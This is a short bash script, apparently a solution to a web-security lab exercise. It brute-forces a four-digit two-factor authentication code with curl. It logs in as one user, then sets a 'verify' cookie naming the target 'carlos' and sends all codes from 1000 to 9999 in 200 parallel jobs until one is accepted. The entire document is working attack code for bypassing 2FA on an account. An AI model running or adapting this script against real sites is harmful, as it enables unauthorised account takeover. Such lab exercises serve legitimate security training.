#!/usr/bin/bash

# Brute-force 2FA code, with correct credentials
# Valid code found via "cat valid_code"

username="carlos"
# password=$2
url=$1
threads=200 # Sets as needed


find . -name "*_response" -exec rm {} \; # Remove Unecessary files if exist

send_code() { # The launcher function
	curl -s -o $5  -X POST -b "verify=$1" -b "session=$3" -d "mfa-code=$4" $2
}

get_session() {
	curl -s -i -X POST -d "username=$1&password=$2" $3 | grep "session" | cut -d "=" -f 2 | cut -d ";" -f 1 > session
}

running_jobs() {
	jobs -rp | wc -l
}

execute() {
	send_code "$1" "$2" "$3" "$4" "$4_response" &&
	if cat $4_response | grep -q "Incorrect"; then # For disable {curl} output use: "grep -q "Incorrect"
		echo "[*] $4 Not valid" # Comment the line to hide output
		rm $4_response

	else
		echo "[!] Found code: $4"
		echo "$4" > valid_code
	fi
}

url_code="$url"2 # URL for 2FA page
get_session "wiener" "peter" "$url" # Set session cookies to session file
session=$(cat session)
for i in $(seq 1000 9999); do
	echo "i: $i"
	while [ "$(running_jobs)" -gt "$threads" ]; do # Threading limits
		sleep 0.1
	done
	execute "$username" "$url_code" "$session" "$i" &
	[ -f valid_code ] && break # End process if code found
done

rm session
exit 0